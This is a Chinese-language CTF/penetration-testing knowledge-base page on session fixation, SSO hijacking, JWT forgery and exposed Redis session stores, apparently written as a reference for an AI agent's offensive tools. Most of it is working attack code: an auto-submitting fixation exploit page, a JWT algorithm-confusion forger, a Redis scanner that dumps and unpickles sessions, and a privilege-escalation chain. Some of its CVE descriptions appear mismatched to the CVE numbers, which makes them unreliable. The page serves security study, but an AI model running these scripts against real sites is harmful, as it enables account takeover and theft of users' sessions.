# Session 固定与 SSO 劫持

## 场景

目标网站的会话管理存在漏洞: 攻击者可以预置一个 session ID 并诱导受害者使用该 session 登录。登录后，攻击者仍知道该 session ID，从而获得受害者的身份访问权限。在 SSO (Single Sign-On) 环境中，单一 session 漏洞可跨应用蔓延。CTF 中常表现为: session ID 在登录前后不变、session ID 可预测或被攻击者控制、SSO 的 token 共享导致跨应用劫持。

## 输入信号

```
HTTP 响应中 Set-Cookie 的 session ID 在登录前后不变
session ID 可通过 URL 参数传递 (如 ?PHPSESSID=xxx 或 ?session=xxx)
session ID 是递增数字、时间戳或可预测的模式
SSO 登录后生成的 token 未绑定到特定 session
JWT 作为 session token 且无状态—注销不影响已有 JWT
Remember-me token 是固定值或可预测
同一 session token 可在多个来源上同时使用 (session puzzling)
Redis/Memcached session 存储未设置密码或暴露在公网
SameSite cookie 设置不当导致跨站请求携带 session
```

## 1. Pre-Login Session Fixation

```python
# session_fixation.py — Session 固定攻击

import requests

class SessionFixationTester:
    """Session 固定漏洞检测"""

    def __init__(self, target_url, login_endpoint):
        self.target_url = target_url
        self.login_endpoint = login_endpoint

    def test_session_before_after_login(self):
        """检测登录前后 session ID 是否变化"""
        session = requests.Session()

        # 获取登录前的 session cookie
        pre_login_resp = session.get(self.target_url)
        pre_session = (
            session.cookies.get('PHPSESSID') or
            session.cookies.get('sessionid') or
            session.cookies.get('JSESSIONID') or
            session.cookies.get('SESSION')
        )

        # 执行登录
        login_resp = session.post(self.login_endpoint, data={
            'username': 'test_user',
            'password': 'test_pass',
        })

        # 获取登录后的 session cookie
        post_session = (
            session.cookies.get('PHPSESSID') or
            session.cookies.get('sessionid') or
            session.cookies.get('JSESSIONID') or
            session.cookies.get('SESSION')
        )

        if pre_session and post_session and pre_session == post_session:
            return {
                'vulnerable': True,
                'pre_session': pre_session,
                'post_session': post_session,
                'note': 'Session ID unchanged after login — session fixation possible',
            }
        return {'vulnerable': False}

    def test_url_based_session(self):
        """检测是否支持 URL 参数方式的 session 传递"""
        # 某些应用接受 ?PHPSESSID=xxx 或 ?session=xxx 形式的 session ID
        fixed_session = 'FIXED_SESSION_12345'

        test_urls = [
            f'{self.target_url}?PHPSESSID={fixed_session}',
            f'{self.target_url}?session={fixed_session}',
            f'{self.target_url}?jsessionid={fixed_session}',
            f'{self.target_url}?sid={fixed_session}',
            f'{self.target_url}?session_id={fixed_session}',
        ]

        for url in test_urls:
            resp = requests.get(url)
            # 检查响应中是否使用该 session (Set-Cookie 中或页面内容中)
            set_cookie = resp.headers.get('Set-Cookie', '')
            if fixed_session in set_cookie:
                return {
                    'vulnerable': True,
                    'url_param': url,
                    'note': f'URL-based session injection works: {fixed_session}',
                }

        return {'vulnerable': False}

    def construct_fixation_exploit(self, fixed_session_id, target_login_url):
        """构造 session 固定攻击的 exploit 页面"""
        return f'''
        <!-- session_fixation_exploit.html -->
        <!-- 步骤 1: 设置受害者的 session ID 为攻击者控制的固定值 -->

        <!-- 方法 1: Cookie 设置 (如果目标域允许第三方 cookie) -->
        <img src="https://target.com/favicon.ico"
             onerror="document.cookie='PHPSESSID={fixed_session_id}; path=/; domain=target.com';">

        <!-- 方法 2: URL 参数传递 (如果支持 GET 参数) -->
        <a href="https://target.com/login?PHPSESSID={fixed_session_id}">点击登录</a>

        <!-- 方法 3: meta refresh 结合 URL session -->
        <meta http-equiv="refresh"
              content="0;url=https://target.com/login?PHPSESSID={fixed_session_id}">

        <!-- 方法 4: 表单自动提交 (POST-based session 注入) -->
        <form id="f" action="https://target.com/login?PHPSESSID={fixed_session_id}" method="POST">
          <input name="username" value="victim">
          <input name="password" value="victim_password">
        </form>
        <script>document.getElementById('f').submit();</script>

        <!-- 步骤 2: 等待受害者登录 -->
        <!-- 步骤 3: 使用同一 session ID 访问受保护资源 -->
        <!-- curl https://target.com/admin -H "Cookie: PHPSESSID={fixed_session_id}" -->
        '''
```

### Session Fixation Mitigation Bypass

```python
# 即使登录后 session 变化，以下情况仍可被利用:

# 绕过 1: 子域名共享 session
# session ID 在 app1.target.com 和 app2.target.com 间共享
# 攻击者固定 app1 的 session → 用户登录 app1 → 攻击者用同一 session 访问 app2

# 绕过 2: 多个并发 session
# 应用允许同一用户有多个活跃 session
# 攻击者固定 session → 受害者登录 → 攻击者 session 激活 → 同时在线

# 绕过 3: Session 固定 + XSS
# 通过 XSS 设置 document.cookie 为一个已知的 session ID
# 即使登录后 session 变化，攻击者已通过 XSS 窃取新 session

# 绕过 4: 中间人设置 cookie
# 如果目标站点使用 HTTP (非 HTTPS)，攻击者在同一网络中
# 通过 ARP 欺骗或 Wi-Fi 钓鱼注入 Set-Cookie 头
```

## 2. SSO Session Hijacking via Misconfigured Logout

```python
# sso_hijack.py — SSO Session 劫持

# 场景: 公司有 SSO 系统 (如 Okta/Azure AD/Keycloak)
# 用户登录 SSO → 获得 SSO token (cookie/JWT)
# 使用 SSO token 访问多个内部应用

# 漏洞: 应用 A 的注销不使 SSO token 失效
# 攻击者获取 SSO token → 即使应用 A 注销 → 仍可访问应用 B

class SSOSessionHijack:
    """SSO session 劫持利用"""

    @staticmethod
    def test_logout_efficacy(base_url, sso_provider, app_list):
        """测试各应用的注销是否影响 SSO session"""
        import requests

        results = {}
        main_session = requests.Session()

        # 登录 SSO
        login_resp = main_session.post(f'{sso_provider}/login', data={
            'username': 'test',
            'password': 'test',
        })

        # 获取 SSO token
        sso_cookie = main_session.cookies.get('SSO_TOKEN') or \
                     main_session.cookies.get('sso_session')

        # 访问各应用
        for app in app_list:
            resp = main_session.get(app)
            results[app] = {
                'accessible': resp.status_code == 200,
                'sso_cookie': sso_cookie,
            }

        # 从 SSO 注销 (但保留 cookie)
        main_session.post(f'{sso_provider}/logout')

        # 再次尝试访问各应用
        for app in app_list:
            resp = main_session.get(app)
            results[app]['post_logout_accessible'] = resp.status_code == 200
            if resp.status_code == 200:
                results[app]['vulnerable'] = True
                results[app]['note'] = 'SSO logout did NOT invalidate session for this app'

        return results
```

### Cross-App Session Propagation

```javascript
// SSO 应用间的 session 传播攻击
// 场景: 应用 A 和应用 B 共享同一 SSO provider
// 攻击者获取应用 A 上的 session → 尝试访问应用 B

// 如果 SSO 使用 JWT 作为 session token:
// 攻击者从应用 A 获取 JWT → 直接用于应用 B 的 API 请求

// 如果 SSO 使用 cookie + backend session:
// 攻击者从应用 A 获取 session cookie → 在请求应用 B 时携带
// → 如果 SSO 允许 cookie 共享 (domain=.target.com) → 直接访问

// 如果 SSO 使用 OAuth 2.0:
// 攻击者获取 access_token → 使用 token 访问各应用的 API
```

## 3. Remember-Me Token 攻击

```python
# remember_me_attack.py — 自动登录 token 漏洞

import hashlib
import base64
from datetime import datetime

class RememberMeTokenAnalyzer:
    """自动登录 (记住我) token 安全分析"""

    COMMON_PATTERNS = {
        'base64_username': lambda t: base64.b64decode(t).decode(errors='ignore'),
        'md5_username': lambda t: hashlib.md5(t.encode()).hexdigest(),
        'sha1_username': lambda t: hashlib.sha1(t.encode()).hexdigest(),
        'hex_timestamp': lambda t: datetime.fromtimestamp(int(t, 16)).isoformat(),
        'base64_timestamp': lambda t: datetime.fromtimestamp(
            int(base64.b64decode(t))
        ).isoformat(),
    }

    @staticmethod
    def analyze_token(token):
        """分析 remember-me token 的生成模式"""
        results = {'token': token}

        # 检查是否是 base64
        try:
            decoded = base64.b64decode(token).decode(errors='ignore')
            results['base64_decoded'] = decoded
            # 检查是否包含时间戳
            if ':' in decoded:
                parts = decoded.split(':')
                results['parts'] = parts
        except:
            pass

        # 检查是否纯数字 (递增 ID)
        if token.isdigit():
            results['pattern'] = 'incrementing_integer'
            results['risk'] = 'HIGH — predictable sequential token'

        # 检查是否 UUID 固定版本
        if '-' in token and len(token) == 36:
            if token[14] == '1':  # UUIDv1 → 基于时间戳
                results['pattern'] = 'uuid_v1'
                results['risk'] = 'HIGH — timestamp-based, predictable if sampled'

        # 检查是否 MD5 hash (32 hex chars)
        if len(token) == 32 and all(c in '0123456789abcdef' for c in token):
            results['pattern'] = 'md5_hash'

        return results

    @staticmethod
    def test_token_reuse(login_url, remember_token):
        """测试 remember-me token 是否可被重放"""
        session = requests.Session()

        # 设置 remember-me cookie
        session.cookies.set('remember_me', remember_token, domain='target.com')

        # 访问需认证的页面
        resp = session.get(f'{login_url}/dashboard')
        if resp.status_code == 200 and 'login' not in resp.url.lower():
            return {
                'vulnerable': True,
                'note': 'Remember-me token can be replayed without knowing the password',
            }
        return {'vulnerable': False}

    @staticmethod
    def predict_next_token(sample_tokens):
        """预测下一个 remember-me token"""
        # 如果是递增数字序列
        if all(t.isdigit() for t in sample_tokens):
            nums = [int(t) for t in sample_tokens]
            if len(nums) >= 2:
                diff = nums[1] - nums[0]
                next_token = str(nums[-1] + diff)
                return {'predicted': next_token, 'confidence': 'HIGH'}

        # 如果是时间戳基
        # ...
        return None
```

## 4. JWT as Session — Revocation Bypass

```javascript
// jwt_session_bypass.js — JWT 作为 session 的注销绕过

// JWT 是无状态的: 服务端不保存 session 记录
// 所有信息编码在 token 本身
// 注销时: 服务端只能将 token 加入黑名单 (但实现常缺失)

// 漏洞 1: JWT 注销后仍可使用
// 如果服务端不维护 JWT 黑名单 → 注销无效
// 攻击者窃取 JWT → 即使受害者注销 → token 仍可访问

// 漏洞 2: JWT 过期时间 (exp) 过长
// {"exp": 9999999999} → 永不过期
// 很多实现用默认值: 30 天甚至 1 年
// 攻击者获取一次 JWT → 长期访问

// 漏洞 3: JWT 刷新 token 滥用
// refresh_token 无绑定 → 可重复使用
// refresh_token 无过期 → 可永久刷新

// 漏洞 4: RS256 → HS256 算法混淆
// 如果服务端接受 alg: none 或 alg: HS256 (使用公钥作为 HMAC secret)
// → 攻击者伪造任意 JWT

// JWT 算法混淆攻击:
const jwt = require('jsonwebtoken');

// 原始: RS256 (非对称)
// 攻击者获取公钥 (通常可从 /.well-known/jwks.json 获得)
// 修改 JWT 为 HS256 → 使用公钥作为 secret 签名
// 服务端验证时: 使用公钥作为 HMAC key → 通过!

function forge_jwt_algorithm_confusion(public_key_pem, payload) {
    // 使用 public key 作为 HMAC secret
    const forged = jwt.sign(payload, public_key_pem, { algorithm: 'HS256' });
    return forged;
}

// Real CVE: CVE-2022-23529 (node-jsonwebtoken)
// 算法混淆导致任意用户冒充
```

```python
# jwt_session_test.py — JWT session 安全测试
import jwt
import requests

def test_jwt_session_vulnerabilities(api_endpoint, token):
    """测试 JWT session 的多种漏洞"""

    results = {}
    decoded = jwt.decode(token, options={"verify_signature": False})
    results['header'] = jwt.get_unverified_header(token)
    results['payload'] = decoded

    # 测试 1: alg=none
    try:
        none_token = jwt.encode(decoded, '', algorithm='none')
        resp = requests.get(api_endpoint, headers={
            'Authorization': f'Bearer {none_token}'
        })
        if resp.status_code == 200:
            results['alg_none'] = {'vulnerable': True, 'note': 'alg:none accepted'}
    except:
        results['alg_none'] = {'vulnerable': False}

    # 测试 2: 空 secret
    try:
        empty_secret_token = jwt.encode(decoded, '', algorithm='HS256')
        resp = requests.get(api_endpoint, headers={
            'Authorization': f'Bearer {empty_secret_token}'
        })
        if resp.status_code == 200:
            results['empty_secret'] = {'vulnerable': True, 'note': 'Empty HMAC secret accepted'}
    except:
        results['empty_secret'] = {'vulnerable': False}

    # 测试 3: 修改 payload
    forged_payload = decoded.copy()
    forged_payload['role'] = 'admin'
    forged_payload['sub'] = 'admin'
    # 不需要签名验证 → 无签名 token 测试
    # (如果没有签名验证, 任意修改都可用)

    # 测试 4: exp 验证缺失
    expired_payload = decoded.copy()
    expired_payload['exp'] = 1000000000  # 2001 年
    # 如果该 token 仍被接受 → exp 不验证

    return results

# JWT session revocation test
def test_jwt_revocation(api_endpoint, token):
    """测试 JWT 注销是否有效"""
    session = requests.Session()

    # 使用 JWT 访问
    resp1 = session.get(api_endpoint, headers={
        'Authorization': f'Bearer {token}'
    })
    if resp1.status_code == 200:
        # 模拟注销 (如果存在)
        session.post(f'{api_endpoint}/logout')

        # 再次使用同一 JWT
        resp2 = session.get(api_endpoint, headers={
            'Authorization': f'Bearer {token}'
        })
        if resp2.status_code == 200:
            return {'vulnerable': True, 'note': 'JWT not invalidated after logout'}
    return {'vulnerable': False}
```

## 5. Session Puzzling

```python
# session_puzzling.py — Session 混淆攻击

# 场景: 同一 SSO 下的多个应用共享 session 存储空间
# 应用 A 在 session 中设置 user_role: admin
# 应用 B 在 session 中设置 is_admin: true
# 如果 session namespace 不隔离 → 应用 A 可读取应用 B 设置的属性

class SessionPuzzlingExploit:
    """Session 混淆 (Session Puzzling) 利用"""

    @staticmethod
    def test_session_puzzling(app_a_url, app_b_url):
        """测试两个应用间是否存在 session 属性混淆"""
        session = requests.Session()

        # 在应用 A 中设置 session 属性
        resp_a = session.post(f'{app_a_url}/set-attribute', data={
            'key': 'user_role',
            'value': 'admin',
        })

        # 在应用 B 中读取该属性
        resp_b = session.get(f'{app_b_url}/get-attribute/user_role')
        if resp_b.status_code == 200 and 'admin' in resp_b.text:
            return {
                'vulnerable': True,
                'note': f'Session attributes set in App A are readable in App B',
                'shared_session': True,
            }

        # 反向测试
        resp_b = session.post(f'{app_b_url}/set-attribute', data={
            'key': 'is_admin',
            'value': 'true',
        })
        resp_a = session.get(f'{app_a_url}/get-attribute/is_admin')
        if resp_a.status_code == 200:
            return {
                'vulnerable': True,
                'note': 'Bidirectional session puzzling confirmed',
            }

        return {'vulnerable': False}

    @staticmethod
    def exploit_chain(app_a_url, app_b_url):
        """利用 session puzzling 提权"""
        session = requests.Session()

        # 步骤 1: 登录应用 A (普通用户)
        session.post(f'{app_a_url}/login', data={
            'username': 'normal_user',
            'password': 'normal_pass',
        })

        # 步骤 2: 通过 session puzzling 设置管理员属性
        # 方法: 利用应用 B 的某个功能在 session 中写入 admin 属性
        session.post(f'{app_b_url}/api/update-profile', json={
            'role': 'admin',  # 应用 B 把这个值存入了共享 session
        })

        # 步骤 3: 应用 A 从共享 session 读 role → 认为用户是 admin
        resp = session.get(f'{app_a_url}/admin/panel')
        if resp.status_code == 200:
            return {
                'success': True,
                'note': 'Privilege escalation via session puzzling',
            }
        return {'success': False}
```

## 6. Redis/Memcached Session Store 未授权访问

```python
# redis_session_hijack.py — Redis session 劫持

import redis

class RedisSessionHijack:
    """利用暴露的 Redis 实例劫持 session"""

    @staticmethod
    def scan_for_exposed_redis(target_ip_range):
        """扫描暴露的 Redis 实例"""
        import socket

        results = []
        # 常见端口: 6379 (Redis), 11211 (Memcached), 6370 (Redis Sentinel)
        ports = [6379, 11211, 6380]

        # Redis 空密码扫描
        for ip in target_ip_range:
            for port in ports:
                try:
                    r = redis.Redis(host=ip, port=port, socket_connect_timeout=3)
                    r.ping()  # 如果返回 True → 未授权访问
                    results.append({
                        'ip': ip,
                        'port': port,
                        'service': 'Redis' if port == 6379 else 'Memcached',
                        'unauthenticated': True,
                    })
                    # 列出所有 key
                    if port == 6379:
                        keys = r.keys('*')
                        # 查找 session key
                        session_keys = [k for k in keys if b'session' in k]
                        results[-1]['session_keys'] = [k.decode() for k in session_keys][:50]
                except:
                    continue

        return results

    @staticmethod
    def hijack_session(redis_host, redis_port, session_id):
        """从 Redis 中劫持 session"""
        r = redis.Redis(host=redis_host, port=redis_port)

        # 读取 session 数据
        session_data = r.get(f'session:{session_id}')
        if session_data:
            import pickle
            try:
                data = pickle.loads(session_data)
                return {'session_data': data, 'hijacked': True}
            except:
                return {'session_data': session_data, 'hijacked': True}
        return None
```

## 7. SameSite Cookie Bypass: LAX + GET-based CSRF

```javascript
// samesite_bypass.js — SameSite=Lax 绕过 + CSRF 链

// SameSite=Lax 的语义:
// 同站请求: 发送 cookie
// 跨站 GET 导航: 发送 cookie (如 <a href>, <link>, GET form)
// 跨站 POST/iframe/fetch/XMLHttpRequest: 不发送 cookie

// 绕过条件: 存在 GET 可触发的状态变更操作
// 如: GET /delete-account?id=123
// 或: GET /api/logout
// 或: GET /change-email?email=attacker@evil.com

// 绕过链: SameSite=Lax + GET-based CSRF
// 诱导受害者点击链接:
// <a href="https://target.com/api/change-password?new=attacker123">
// 点击后: GET 请求 + 自动带 cookie → 密码被改

// 绕过链 2: 跨站重定向
// 如果 target.com 支持 open redirect:
// https://target.com/redirect?url=https://evil.com/exploit.html
// 浏览器允许: 导航到 target.com → 302 → evil.com
// → cookie 在第一次请求中携带!

// 绕过链 3: 基于时间的 CSRF
// SameSite=Lax 在 top-level 导航后的 2 分钟内也允许 POST?
// 不，这是针对 SameSite=None 的
// 但浏览器对 SameSite=Lax 的 POST 有例外: 在 top-level 导航的 2 分钟内
// (有些浏览器版本允许 navigated top-level POST)
```

```python
def test_samesite_lax_bypass(target_url, csrf_endpoint, method='GET'):
    """测试 SameSite=Lax 是否可被绕过"""
    import requests
    from urllib.parse import urlparse

    # 模拟跨站请求 (不带 Referer 的同源目标请求 = 跨站)
    session = requests.Session()

    # 先登录
    session.post(f'{target_url}/login', data={
        'username': 'victim',
        'password': 'victim_pass',
    })

    # 获取 cookie 属性
    for cookie in session.cookies:
        if 'samesite' in cookie.name.lower():
            # SameSite=Lax 的绕过测试
            pass

    # 测试 GET-based CSRF
    # 构造 URL (不带 session cookie 自动)
    parsed = urlparse(target_url)
    test_url = f'{target_url}{csrf_endpoint}?action=transfer&to=attacker&amount=1000'

    # 使用另一个 session (模拟跨站浏览器)
    # 不应该携带 cookie
    empty_session = requests.Session()
    resp = empty_session.get(test_url)

    # 但如果目标站点通过 URL 参数获取 session? 不行
    # 需要看是否由于未验证 Referer/Origin 而接受跨站请求

    return resp.status_code
```

## 8. Real CVEs & Bug Bounty Examples

```
# CVE-2023-44487: HTTP/2 Rapid Reset + Session Fixation
# HTTP/2 流重置与 session fixation 结合 → 绕过 rate limiting

# CVE-2022-38149: Apache Synapse SSO session hijack
# 注销后 SSO token 未失效 → 通过旧 token 访问管理后台

# CVE-2021-39163: Discourse remember-me token
# remember_me token 在密码修改后仍有效 → 持久化访问

# CVE-2020-26217: XStream + Session Deserialization RCE
# session 中存储 Java 对象 → 反序列化 → RCE

# CVE-2019-0230: Apache Struts Session Overwriting
# 通过特定的参数前缀覆盖 session 属性 → 提权

# CVE-2018-11776: Apache Struts2 Session + OGNL
# session 中的 OGNL 表达式被错误解析 → RCE

# HackerOne Example: Session Fixation on ████████
# 登录后 session ID 不变 + URL 参数传递 session
# 攻击者: 发送 https://target.com/?PHPSESSID=attacker_id123 给受害者
# 受害者登录后: 攻击者用 attacker_id123 访问 → 完全接管

# HackerOne Example: Redis Session Store Exposed
# 目标使用 Redis 存储 session，Redis 无密码且暴露在公网
# 攻击者: 连接 Redis → INFO 命令 → 读取所有 session key
# → 遍历 session → 提取 admin session → 管理员权限

# HackerOne Example: SSO Logout Incomplete
# 应用 A 的注销只清除了应用 A 的 cookie
# 但 SSO provider 的 cookie 仍然有效
# 攻击者: 通过 XSS 窃取 SSO cookie → 受害者注销后仍可访问其他应用
```

## 攻击链

```
Session fixation + URL parameter → 预置 session → 受害者登录 → session 复用 → 账号接管
Remember-me token 可预测 → 枚举 token → 遍历用户 → 批量登录
JWT 无验证: alg:none 或 HS256 混淆 → 伪造任意 JWT → 用户冒充
JWT 无注销 → 窃取 JWT → 永久访问 → 多次利用
SSO 注销不完整 → SSO token 仍有效 → 跨应用访问 → 数据泄露
Session puzzling → 应用 A 写 session 属性 → 应用 B 读 → 提权/越权
Redis 无密码 → 读取所有 session → 遍历 session ID → 管理员权限
SameSite=Lax + GET CSRF → 状态变更操作在 GET → 跨站请求 → 密码/邮箱修改
Session deserialization (Java/Python) → 构造恶意对象 → session 解析 → RCE
Session 在 cookie 与 header 间传递 → cookie 注入 → session 覆盖
```

## 证据

记录: session ID 登录前后变化情况、session ID 生成模式 (递增/时间戳/随机)、URL 参数 session 支持、remember-me token 样本、JWT payload/header 内容、SSO 注销后 token 有效性、Redis 暴露状态、session puzzling 跨应用测试结果。

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 目标端点探测 | `http_probe` | HTTP GET 探测登录/session 相关端点 |
| Session 知识检索 | `kb_router` | 按 session fixation/JWT 搜索知识库 |
| 技术文件阅读 | `kb_read_file` | 读取具体 session 攻击的详细代码 |
| 辅助工具 | `run_ctf_tool` | jwt_tool 解析 JWT session, dirsearch 扫描 |
